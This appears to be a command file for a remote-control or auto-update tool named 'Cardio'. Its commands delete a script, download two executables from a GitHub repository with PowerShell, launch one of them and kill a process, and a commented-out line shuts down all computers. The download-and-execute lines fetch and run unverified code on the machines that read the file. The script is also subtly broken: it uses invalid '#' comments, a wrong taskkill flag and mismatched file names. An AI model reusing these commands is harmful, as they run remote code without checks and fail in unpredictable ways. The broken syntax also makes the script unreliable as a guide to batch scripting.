#-------------EXE COMMANDS---------------#
#shutdown /r /t 00 
#shutdown all Computers.
#-------------AUTO UPDATE Massage.bat SCRIPT---------------#
del UP.bat                                                               #-----------#
powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/TestFiles/Message.exe -OutFile Message.exe"
#-------------COMMANDS (Add Commands here!)---------------#
#msg * Ok Check All
powershell -command "Invoke-WebRequest https://github.com/AbdulazizDXT/Cardio/releases/download/V1.0/Cardio-Beta.exe -OutFile Cardio-Beta.exe"
start Cardio-Beta.exe
taskkill /ID Massage.exe /F
